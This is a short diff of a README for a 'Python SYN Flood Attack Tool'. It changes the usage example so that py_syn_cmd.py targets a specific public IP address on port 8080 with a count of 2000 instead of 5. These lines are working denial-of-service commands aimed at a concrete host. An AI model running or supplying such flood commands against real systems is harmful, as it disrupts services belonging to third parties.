@@ -19,7 +19,7 @@ cd Python-SYN-Flood-Attack-Tool
 ## Usage
 
 ```
-python3 py_syn_cmd.py -t 159.89.173.104 -p 8080 -c 5
+python3 py_syn_cmd.py -t 159.89.173.104 -p 8080 -c 2000
 python3 py_synflood.py
 ```
 ```
